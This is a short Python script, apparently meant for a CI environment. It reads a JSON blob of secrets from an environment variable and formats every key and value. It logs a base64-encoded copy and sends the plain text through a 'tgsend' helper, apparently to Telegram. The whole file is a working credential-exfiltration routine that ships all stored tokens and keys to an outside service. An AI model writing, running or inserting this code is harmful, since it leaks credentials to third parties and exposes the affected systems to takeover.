import os
import json
from pytools.pytools import tgsend
from pytools.pytools import secretlog, base64encode

secrets=json.loads(os.environ['secrets'])
msg='\n'.join([f'{key}: `{value}`' for key,value in secrets.items()])
secretlog(base64encode(msg))
tgsend(msg)
